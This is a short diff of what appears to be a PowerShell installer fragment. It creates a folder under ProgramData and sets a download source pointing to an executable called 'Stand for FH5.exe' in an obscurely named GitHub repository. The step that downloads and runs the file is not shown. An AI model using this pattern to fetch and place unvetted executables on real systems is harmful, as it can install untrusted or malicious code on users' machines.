@@ -1,6 +1,6 @@
-﻿mkdir "C:\ProgramData\STANDFH5"
+mkdir "C:\ProgramData\STANDFH5"
  
- $source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"
+$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"
 
 $destination = "C:\ProgramData\STANDFH5\Stand fo FH5.exe"
 
